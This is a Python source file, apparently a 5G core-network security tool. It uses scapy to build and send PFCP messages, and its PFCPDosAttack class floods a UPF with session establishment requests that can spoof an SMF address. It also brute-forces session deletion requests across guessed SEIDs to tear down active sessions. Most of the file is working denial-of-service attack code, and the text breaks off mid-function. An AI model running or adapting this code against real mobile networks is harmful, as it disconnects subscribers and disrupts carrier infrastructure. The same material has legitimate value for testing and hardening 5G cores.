from scapy.all import send, sendp, sr1, Ether, IP, UDP, conf
from scapy.contrib.pfcp import *
import time, random, ipaddress, threading


import sys

conf.verb = 0

EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"
SPOOFED_SMF_ADDR = "10.100.200.8"
DEST_PORT = 8805
SRC_PORT = 8805
NET_IFACE= "eth0"
seq=1

class TColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    INVERSE = '\033[7m'

class Log:
    def __init__(self, prefix):
        self.prefix = prefix
    
    def set_prefix(self, prefix):
        self.prefix = prefix

    def info(self, message):
        print(f"{TColors.BOLD}{TColors.BLUE}{self.prefix}{TColors.RESET} {message}")

    def error(self, message):
        print(f"{TColors.BOLD}{TColors.RED}{self.prefix}{TColors.RESET} {message}")

    def success(self, message):
        print(f"{TColors.BOLD}{TColors.GREEN}{self.prefix}{TColors.RESET} {message}")

    def warning(self, message):
        print(f"{TColors.BOLD}{TColors.YELLOW}{self.prefix}{TColors.RESET} {message}")

    

# TODO: rename

# TODO: Docstrings
# TODO: Internal functions


class HandleParams:
    def __init__(self, classPrefix=""):
        self.basePrefix = f"[HandleParams]{classPrefix}"
        self.logger = Log(self.basePrefix)
        self.default_error_messages = {
            "src_addr": "No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').",
            "dest_addr": "No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').",
            "src_port": "No source port provided. Expected a valid port number (e.g., 8805).",
            "dest_port": "No destination port provided. Expected a valid port number (e.g., 8805).",

            "seid": "No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).",
            
            "evil_addr": "No evil address provided.",
            "upf_addr": "No UPF address provided.",
            "smf_addr": "No SMF address provided.",
            "ue_addr": "No UE address provided.",
            
            "target_seid": "No SEID provided.",
            "far_id": "No FAR ID provided.",
            "update_ie": "No Update IE provided.",
            "far_range": "No FAR ID range provided.",
            "session_range": "No Session ID range provided.",

        }
    
    def set_method_prefix(self, prefix):
        self.logger.set_prefix(self.basePrefix + prefix)

    def check_parameters(self, params_required: dict, method_prefix=""):
        ret_val = True
        self.set_method_prefix(method_prefix)
        for param_name, param_value in params_required.items():
            if param_value is None or not param_value :
                error_message = self.default_error_messages.get(
                    param_name, f"No {param_name} provided. Expected a valid value."
                )
                self.logger.error(f"Error: {error_message}")
                ret_val = False

        if not ret_val:
            self.logger.error("Error: Invalid parameters provided.")

        return ret_val



# PFCP Request Builder
# PFCP Session Manager
# PFCP Toolkit

class PFCPToolkit:
    """
    PFCPToolkit is a utility class to build, send, and manage PFCP messages for 5G core network testing.

    This class simplifies the creation and transmission of PFCP Association Setup, 
    Session Establishment, Modification, and Deletion requests. It provides functionalities 
    to randomize identifiers (SEID, TEID, Sequence numbers) and manage PFCP sessions programmatically.

    Main Features:
        - Build and send PFCP Association Setup Requests
        - Build and send PFCP Session Establishment Requests (with optional random FAR generation)
        - Build and send PFCP Session Modification Requests (targeting FARs)
        - Build and send PFCP Session Deletion Requests
        - Support for verbose logging, turbo sending mode, and Ethernet layer (sendp)

    Attributes:
        src_addr (str): Source IP address for PFCP messages.
        dest_addr (str): Destination IP address (UPF or peer).
        src_port (int): Source UDP port (default 8805).
        dest_port (int): Destination UDP port (default 8805).
        verbose (bool): Enables detailed logging output if True.
        classPrefix (str): Prefix used for internal logging tags.
        logger (Log): Logger instance for structured outputs.
        paramsHandler (HandleParams): Helper for parameter validation.
        seq (int): Sequence number for PFCP messages, auto-incremented.
        seid (int, optional): Default SEID for session management (can be overridden).
    """

    def __init__(self, src_addr=None, dest_addr=None, src_port=8805, dest_port=8805, verbose=False):
        self.src_addr = src_addr
        self.dest_addr = dest_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.verbose = verbose
        self.seid=None
        
        self.classPrefix = "[EZ-PFCP]"
        self.logger = Log(self.classPrefix)
        
        self.paramsHandler = HandleParams(self.classPrefix)
        
        
        if verbose:
            self.logger.info("Verbose mode enabled")

    # Utility functions 
    
        
            
            
    
        
    def new_seq(self, randomize=False):
        """
        Generate a new sequence number for PFCP messages.

        Args:
            randomize (bool, optional): Randomizes the sequence number. Defaults to False.

        Returns:
            integer: The generated sequence number.
        """
        
        if randomize:
            seqNbr = random.randint(1, 0xFFFFFFFF)
            return seqNbr
        seq = self.seq
        self.seq += 1
        if self.seq > 0xFFFFFFFF:
            self.seq = 1
        return seq
    
    
    # FAR Operations

    def Random_create_far(self):
        """
        Create a random FAR (Forwarding Action Rule) for PFCP messages.

        Returns:
            IE_CreateFAR: The created FAR packet.
        """
        return IE_CreateFAR(
            IE_list=[
                IE_FAR_Id(id=random.randint(1, 255)),
                IE_ApplyAction(FORW=1),
                IE_OuterHeaderCreation(
                    GTPUUDPIPV4=1, 
                    TEID=random.randint(1, 0xFFFFFFFF),
                    ipv4=".".join(str(random.randint(1, 254)) for _ in range(4)),
                    port=2152
                )
            ]
        )
        
    def Update_FAR(far_id, apply_action_ie=IE_ApplyAction(FORW=1)):
        """
        Create a raw Update FAR (Forwarding Action Rule) Information Element for PFCP messages.

        Args:
            far_id (int): The FAR ID to update within the PFCP session.
            apply_action_ie (IE_ApplyAction, optional): The Apply Action IE specifying the new behavior. Defaults to IE_ApplyAction(FORW=1).

        Returns:
            Raw: Raw bytes representing the Update FAR IE, ready to be included in a PFCP message.
        """

        ie_update_far = IE_UpdateFAR(
        IE_list=[
            IE_FAR_Id(id=far_id),
            apply_action_ie
            ]
        )
        ie_update_far = Raw(bytes(ie_update_far))
        return ie_update_far
    
    
    # PFCP Message Building Functions
    
    def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        """
        Build a PFCP Association Setup Request packet.

        Args:
            src_addr (str, optional): Source IPv4 address of the PFCP initiator. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address of the PFCP peer (e.g., UPF). Defaults to instance's dest_addr.
            src_port (int, optional): Source UDP port for the PFCP message. Defaults to instance's src_port.
            dest_port (int, optional): Destination UDP port for the PFCP message. Defaults to instance's dest_port.

        Returns:
            scapy.packet.Packet: The constructed PFCP Association Setup Request packet ready to send.
        """

        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            
            
        }, "[Build_PFCP_association_setup_req]"):
            return 
        

        
        seq = self.new_seq()
        
        # Trick to bypass scapy's bad parsing
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
            timestamp=int(time.time())
        )))
        pfcp_msg = PFCP(
            version=1,
            message_type=5,
            seid=0,
            S=0,
            seq=seq
        )/node_id/recovery_timestamp

        packet = IP(src=src_addr, dst=dest_addr)/UDP(sport=src_port, dport=dest_port)/pfcp_msg
        packet = packet.__class__(bytes(packet))
        return packet
    
    def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
        """
        Build a PFCP Session Establishment Request packet.

        Args:
            src_addr (str, optional): Source IPv4 address of the PFCP message sender. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address (usually the UPF). Defaults to instance's dest_addr.
            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port for receiving the PFCP message. Defaults to instance's dest_port.
            seid (int, optional): Session Endpoint Identifier to assign to the session. Defaults to 0x1.
            ue_addr (str, optional): IPv4 address of the User Equipment (UE) to be associated with the PDR. Defaults to None.
            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
            precedence (int, optional): Priority value assigned to the PDR (lower values have higher priority). Defaults to 255.
            interface (int, optional): Source interface type for the packet detection (e.g., 1 = Access). Defaults to 1.
            random_seq (bool, optional): If True, randomizes the PFCP sequence number. Defaults to False.
            random_far_number (int, optional): Number of additional randomly generated FARs to append. Defaults to 0.

        Returns:
            scapy.packet.Packet: The constructed PFCP Session Establishment Request packet ready for transmission.
        """

        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid,
            
        }, "[Build_PFCP_session_establishment_req]"):
            return 
        

        
        seq = self.new_seq(randomize=random_seq)
        
        
        
        ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=src_addr)))

        ie_createpdr = Raw(bytes(IE_CreatePDR(IE_list=[
            IE_PDR_Id(id=1),
            IE_Precedence(precedence=precedence),
            IE_PDI(IE_list=[
                IE_SourceInterface(interface=interface),
                
                IE_FTEID(TEID=teid, V4=1, ipv4=ue_addr)
            ]),
            IE_FAR_Id(id=1)
        ])))

        ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
            
            IE_FAR_Id(id=1),
            IE_ApplyAction(FORW=1),
            IE_OuterHeaderCreation(
                GTPUUDPIPV4=1, 
                TEID=teid, 
                ipv4=ue_addr, 
                port=2152
                )
        ])))

        pfcp_msg = PFCP(
            version=1,
            message_type=50,
            seid=0,
            S=1,
            seq=seq
        ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar
        
        if random_far_number:
            for i in range(random_far_number):
                pfcp_msg = pfcp_msg / Raw(bytes(self.Random_create_far()))

        pkt = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
        pkt = pkt.__class__(bytes(pkt))  # Recalcul final
        return pkt


    def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None, random_seq=False):
        """
        Build a PFCP Session Establishment Request packet.

        Args:
            src_addr (str, optional): Source IP address for the PFCP message. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IP address (typically the UPF). Defaults to instance's dest_addr.
            src_port (int, optional): Source UDP port for the PFCP message. Defaults to instance's src_port.
            dest_port (int, optional): Destination UDP port for the PFCP message. Defaults to instance's dest_port.
            seid (int, optional): Session Endpoint Identifier (SEID) for the session. Defaults to 0x1.
            ue_addr (str, optional): User Equipment IP address (UE IP). Defaults to None.
            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
            precedence (int, optional): Priority level for the PDR. Defaults to 255.
            interface (int, optional): Source interface type (1 = Access). Defaults to 1.
            random_seq (bool, optional): Randomize the PFCP message sequence number if True. Defaults to False.
            random_far_number (int, optional): Number of additional FARs to randomly create and append. Defaults to 0.

        Returns:
            scapy.packet.Packet: The constructed PFCP Session Establishment Request packet ready to send.
        """

        seid = seid or self.seid
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid
            
            
        }, "[Build_PFCP_session_deletion_req]"):
            return 
        

                
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))

        pfcp_msg = PFCP(
            version=1,
            message_type=54,
            seid=seid,
            S=1,
            seq=self.new_seq(randomize=random_seq)
        ) / node_id
        packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
        packet = packet.__class__(bytes(packet))
        return packet
    
    
    def Build_PFCP_session_modification_req(self, seid, far_id, update_ie=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        """
        Build a PFCP Session Modification Request packet.

        Args:
            seid (int): Session Endpoint Identifier (SEID) of the session to modify.
            far_id (int): Forwarding Action Rule (FAR) ID to update.
            update_ie (scapy.packet.Packet, optional): Pre-built Update FAR Information Element to include. 
                If None, a default Update FAR is generated using the provided FAR ID. Defaults to None.
            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address (typically the UPF). Defaults to instance's dest_addr.
            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port for the PFCP message. Defaults to instance's dest_port.

        Returns:
            scapy.packet.Packet: The constructed PFCP Session Modification Request packet ready for transmission.
        """

        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid,
            "far_id": far_id,
            "update_ie": update_ie 
            
        }, "[Build_PFCP_session_modification_req]"):
            return 
        

        
       
        update_ie = update_ie or self.Update_FAR(far_id)
        
        
        packet = PFCP(
            version=1,
            message_type=52,
            S=1,
            seid=seid,
            seq=1
        ) / update_ie
        packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / packet
        packet = packet.__class__(bytes(packet))
        return packet

    
    


    def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        """
        Send a PFCP Association Setup Request to a PFCP peer (typically a UPF).

        Args:
            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's dest_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,

            
        }, "[Send_PFCP_association_setup_req]"):
            return
        
        seq = self.new_seq()
        
        
        pfcp_association_setup_req = self.Build_PFCP_association_setup_req(
            src_addr=src_addr,
            dest_addr=dest_addr,
            src_port=src_port,
            dest_port=dest_port
        )
        send(pfcp_association_setup_req)
        if self.verbose:
            self.logger.success(f"PFCP Association Setup packet sent to {dest_addr}")
            
            
    def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0, use_sendp=False):
        """
        Send a PFCP Session Establishment Request to a PFCP peer.

        Args:
            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's dest_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
            seid (int, optional): Session Endpoint Identifier (SEID) for the session. Defaults to 0x1.
            ue_addr (str, optional): IPv4 address of the User Equipment (UE). Defaults to None.
            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
            precedence (int, optional): Priority value for the PDR. Defaults to 255.
            interface (int, optional): Source interface type for the PDR (e.g., 1 = Access). Defaults to 1.
            random_seq (bool, optional): If True, randomizes the PFCP sequence number. Defaults to False.
            random_far_number (int, optional): Number of additional random FARs to include. Defaults to 0.
            use_sendp (bool, optional): If True, sends using Layer 2 (sendp with Ethernet). Defaults to False.

        Returns:
            None
        """

        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        seq = self.new_seq(randomize=random_seq)
        

        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid,
            "ue_addr": ue_addr,
        }, "[Send_PFCP_session_establishment_req]"):
            return
        
        if self.verbose:
            self.logger.info(f"Sending PFCP session establishment request to {dest_addr} with SEID {seid}, UE address {ue_addr}, TEID {teid}, precedence {precedence}, interface {interface}")
           
        
        
        
        pfcp_session_establishment_req = self.Build_PFCP_session_establishment_req(
            src_addr=src_addr,
            dest_addr=dest_addr,
            src_port=src_port,
            dest_port=dest_port,
            seid=seid,
            ue_addr=ue_addr,
            teid=teid,
            precedence=precedence,
            interface=interface,
            random_seq=random_seq,
            random_far_number=random_far_number
            
        )
        if use_sendp:
            sendp( Ether() /pfcp_session_establishment_req, iface="eth0")
        else:
            send(pfcp_session_establishment_req)
        if self.verbose:
            self.logger.success(f"PFCP Session Establishment packet sent to {dest_addr} with SEID {seid}")
            

    def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False, random_seq=False):
        """
        Send a PFCP Session Deletion Request to a PFCP peer (typically a UPF).

        Args:
            seid (int): Session Endpoint Identifier (SEID) of the session to delete.
            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
            dest_addr (str, optional): Destination IPv4 address (typically the UPF). Defaults to instance's dest_addr.
            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port for the PFCP message. Defaults to instance's dest_port.
            turbo (bool, optional): If True, send the packet without waiting for a response (fire-and-forget mode). Defaults to False.
            random_seq (bool, optional): If True, randomize the sequence number in the PFCP message. Defaults to False.

        Returns:
            int or None: PFCP Cause IE value received in response if available, otherwise None.
        """

        
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        
        
        if not self.paramsHandler.check_parameters({
            "src_addr": src_addr,
            "dest_addr": dest_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "seid": seid
            
        }, "[Send_PFCP_session_deletion_req]"):
            return
        
        seq=self.new_seq()

        req = self.Build_PFCP_session_deletion_req(
                seid=seid,
                src_addr=src_addr,
                dest_addr=dest_addr,
                src_port=src_port,
                dest_port=dest_port,
                random_seq=random_seq
            )
        if turbo:
            send(req)
            return
        
        res = sr1(req)
        if not res:
            self.logger.error("No response received for PFCP session deletion request")
            
        
        pfcp_cause = None
        
        for ie in res[PFCP].IE_list:
            if isinstance(ie, IE_Cause):
                pfcp_cause = ie.cause
                break
        if self.verbose:
            self.logger.info(f"PFCP Session Deletion response received with cause: {pfcp_cause}")
            
        return pfcp_cause
        
        

        
        
        
        
        
        
        
        
        
        




class PFCPDosAttack:
    """
    Performs PFCP-based Denial of Service (DoS) attacks against a target UPF.

    This class provides functionalities to automate the sending of PFCP session establishment, 
    deletion, and modification requests in order to flood or brute-force a 5G core network component (UPF).

    Attributes:
        evil_addr (str): Source IP address used to send PFCP messages (attacker IP).
        upf_addr (str): Destination IP address of the target UPF.
        src_port (int): UDP source port for PFCP messages.
        dest_port (int): UDP destination port for PFCP messages (default PFCP port 8805).
        interface (str): Network interface used for sending packets (e.g., "eth0").
        ue_base_addr (IPv4Address): Starting IP address for generating UE IP addresses.
        verbose (bool): Enable verbose logging.
        prepare (bool): Prepare packets in memory before sending to improve speed.
        randomize (bool): Enable randomization of sequence numbers, TEID, SEID, UE addresses.
        random_far_number (int): Number of random FARs to attach to session establishment.
        smf_addr (str, optional): Address of the SMF for targeted deletion attacks.
    """

    def __init__(self, evil_addr, upf_addr, src_port, dest_port, interface="eth0", ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
        self.evil_addr = evil_addr
        self.upf_addr = upf_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.seid_counter = 1
        self.teid_counter = 1
        self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
        self._ue_counter = 1
        self.pfcp_association_packet= None
        self.pfcp_establishment_packet_list = []
        self.verbose = verbose
        self.prepare = prepare
        self.randomize = randomize
        self.lock = threading.Lock()
        self.random_far_number = random_far_number
        
        self.smf_addr = smf_addr
        self.SESSION_CONTEXT_NOT_FOUND = 65
        self.REQUEST_ACCEPTED = 1
        self.valid_seid_list = list()
        self.log_prefix = f"{TColors.BOLD + TColors.GREEN}[DoS] {TColors.RESET}"
        
        self.classPrefix = "[DoS]"
        self.logger = Log(self.classPrefix)
        self.evil_addr, self.upf_addr, self.src_port, self.dest_port
        self.paramsHandler = HandleParams(self.classPrefix)
        
        self.interface = interface
        
        
    def set_interface(self, interface):
        """
        Set the network interface used to send PFCP packets.

        Args:
            interface (str): Name of the network interface (e.g., "eth0", "ens33").

        Returns:
            None
        """

        self.interface = interface
        if not self.verbose : return
        if interface:
            self.logger.info(f"Interface set to {interface}")
        
    

        
    def set_random_far_number(self, random_far_number=15):
        """
        Set the number of random FARs to be generated for each PFCP session establishment.

        Args:
            random_far_number (int): Number of random Forwarding Action Rules to generate. Defaults to 15.

        Returns:
            None
        """

        
        self.random_far_number = random_far_number
        if not self.verbose : return
        if random_far_number:
            self.logger.info(f"Random FAR number set to {random_far_number}")
            

    def set_randomize(self, randomize=True):
        """
        Enable or disable randomization mode for SEID, TEID, UE IP addresses, and sequence numbers.

        Args:
            randomize (bool, optional): True to enable randomization, False to disable. Defaults to True.

        Returns:
            None
        """

        self.randomize = randomize
        if not self.verbose : return
        if randomize:
            self.logger.info("Randomize mode enabled")
            
        else:
            self.logger.info("Randomize mode disabled")
            
    
    def set_prepare(self, prepare=True):
        """
        Enable or disable preparation mode for PFCP session establishment packets.

        Args:
            prepare (bool, optional): True to enable preparation of packets before sending. Defaults to True.

        Returns:
            None
        """

        self.prepare = prepare
        if not self.verbose : return
        if prepare:
            self.logger.info("Prepare mode enabled")
            
        else:
            self.logger.info("Prepare mode disabled")
            
    
    def set_verbose(self, verbose=True):
        """
        Enable or disable verbose mode for logging.

        Args:
            verbose (bool, optional): True to enable detailed logs, False to disable. Defaults to True.

        Returns:
            None
        """

        self.verbose = verbose
        if verbose:
            self.logger.info("Verbose mode enabled")
            
        else:
            self.logger.info("Verbose mode disabled")
            
    
    def new_ue_addr(self, randomize=False):
        """
        Generate a new UE (User Equipment) IPv4 address.

        Args:
            randomize (bool, optional): If True, generates a completely random IP address. 
                If False, increments from the base UE IP address. Defaults to False.

        Returns:
            str: The generated UE IPv4 address as a string.
        """

        if self.randomize or randomize:
            return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        next_ip = self.ue_base_addr + self._ue_counter
        self._ue_counter += 1
        return str(next_ip)
    
    def new_seq(self, randomize=False):
        """
        Generate a new PFCP sequence number.

        Args:
            randomize (bool, optional): If True, generates a completely random sequence number. 
                If False, increments sequentially with thread safety. Defaults to False.

        Returns:
            int: The generated sequence number.
        """

        if self.randomize or randomize:
            seqNbr = random.randint(1, 0xFFFFFFFF)
            return seqNbr
        
        with self.lock:
            seq = self.seq
            self.seq += 1
            if self.seq > 0xFFFFFFFF:
                self.seq = 1
            return seq
    
    def new_seid(self, randomize=False):
        """
        Generate a new SEID (Session Endpoint Identifier).

        Args:
            randomize (bool, optional): If True, generates a completely random SEID. 
                If False, increments sequentially. Defaults to False.

        Returns:
            int: The generated SEID.
        """

        if self.randomize or randomize:
            self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
            return self.seid
        
        seid = self.seid_counter
        self.seid_counter += 1
        if self.seid_counter > 0xFFFFFFFFFFFFFFFF:
            self.seid_counter = 1
        return seid
    
    def new_teid(self, randomize=False):
        """
        Generate a new TEID (Tunnel Endpoint Identifier).

        Args:
            randomize (bool, optional): If True, generates a completely random TEID. 
                If False, increments sequentially. Defaults to False.

        Returns:
            int: The generated TEID.
        """

        if self.randomize or randomize:
            self.teid = random.randint(1, 0xFFFFFFFF)
            return self.teid
        
        teid = self.teid_counter
        self.teid_counter += 1
        if self.teid_counter > 0xFFFFFFFF:
            self.teid_counter = 1
        return teid
    

    
    def prepare_pfcp_session_establishment_flood(self, count, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
        """
        Prepare a list of PFCP Session Establishment Request packets for flooding.

        This method builds and stores multiple PFCP Session Establishment packets 
        in memory to optimize later flooding operations.

        Args:
            count (int): Number of PFCP Session Establishment packets to generate.
            evil_addr (str, optional): Source IPv4 address for the PFCP packets. Defaults to instance's evil_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF) for the PFCP packets. Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        evil_addr = evil_addr or self.evil_addr
        upf_addr = upf_addr or self.upf_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        if not self.paramsHandler.check_parameters({
            "evil_addr": evil_addr,
            "upf_addr": upf_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            
        }, "[prepare_pfcp_session_establishment_flood]"):
            return
        
        
        self.logger.info(f"Preparing {count} PFCP session establishment packets")
        
        pfcp_obj = PFCPToolkit(evil_addr, upf_addr, src_port, dest_port, verbose=self.verbose)
        
        start_time = time.time()
        last_update = start_time
        
        for i in range(count):
            self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                seid=self.new_seid(), 
                ue_addr=self.new_ue_addr(),
                teid=self.new_teid(),
                random_seq=self.randomize,
                random_far_number=self.random_far_number
                ))
            
            now = time.time()
            if now - last_update >= 5:
                percent = (i + 1)* 100 // count
                last_update = now
                self.logger.info(f"[DoS] Progress: {percent}% ({i+1}/{count})")
                
        self.logger.success(f"Prepared the PFCP association setup packet")
        self.logger.success(f"Prepared {count} PFCP session establishment packets")

    
    def prepare_pfcp_session_deletion_flood(self, count, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
        if self.verbose:
            self.logger.info(f"Preparing {count} PFCP session deletion packets")

        print("Hello World")
    
    def pfcp_session_establishment_flood_worker(self, count, start_index=0):
        """
        Worker function to send PFCP Session Establishment Requests.

        If prepare mode is enabled, sends pre-built packets from memory.
        Otherwise, dynamically builds and sends new PFCP Session Establishment packets.

        Args:
            count (int): Number of PFCP requests to send.
            start_index (int, optional): Starting index in the prepared packet list if in prepare mode. Defaults to 0.

        Returns:
            None
        """

        
        worker_logger = Log(f"[DoS][Worker-{start_index}]")
        if self.verbose:
            if self.prepare:
                worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
                
            else:
                worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
                
            
            
        
        if self.prepare:
            for i in range(start_index, start_index+count):
                try:
                    send(self.pfcp_establishment_packet_list[i])
                except Exception as e:
                    worker_logger.error(f"Error sending PFCP session establishment packet: {e}")
                    
        else:
            pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
            for i in range(count):
                try:
                    pfcp_obj.Send_PFCP_session_establishment_req(
                        seid=self.new_seid(), 
                        ue_addr=self.new_ue_addr(),
                        teid=self.new_teid(),
                        random_seq=self.randomize,
                        random_far_number=self.random_far_number,
                        net_interface=self.interface,
                        use_sendp=True
                    )
                except Exception as e:
                    worker_logger.error(f"Error sending PFCP session establishment request: {e}")
                    
                
            
        if self.verbose:
            worker_logger.success(f"Worker finished flooding with {count} requests")
            

    def pfcp_session_deletion_bruteforce_worker(self, count, start_index=0):
        """
        Worker function to brute-force PFCP Session Deletion Requests.

        Sends PFCP Session Deletion Requests across a range of SEIDs,
        attempting to find valid active sessions.

        Args:
            count (int): Number of SEIDs to try.
            start_index (int, optional): Starting SEID offset. Defaults to 0.

        Returns:
            None
        """

        worker_logger = Log(f"[DoS][Worker-{start_index}]")
        if self.verbose:
            worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
            
        
        
        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
        for i in range(start_index, start_index+count): 
            try:

                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i+1, random_seq=True)

                    
                if response == self.REQUEST_ACCEPTED:
                    worker_logger.success(f"PFCP session deletion request accepted; SEID: {hex(i+1)}")
                    
                    self.valid_seid_list.append(i+1)
                    
            except Exception as e:
                worker_logger.error(f"Error sending PFCP session deletion request: {e}")
                
                
    
    def Start_pfcp_session_deletion_bruteforce(self, reqNbr=100, num_threads=1):
        """
        Launch a multithreaded brute-force attack by sending PFCP Session Deletion Requests.

        Divides the total number of requests across multiple threads 
        and attempts to discover active sessions based on SEID responses.

        Args:
            reqNbr (int, optional): Total number of PFCP deletion requests to send. Defaults to 100.
            num_threads (int, optional): Number of threads to use for concurrent sending. Defaults to 1.

        Returns:
            None
        """


        if self.verbose:
            self.logger.info(f"Starting PFCP session deletion bruteforce with {reqNbr} requests and {num_threads} threads")
            

        threads= []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads
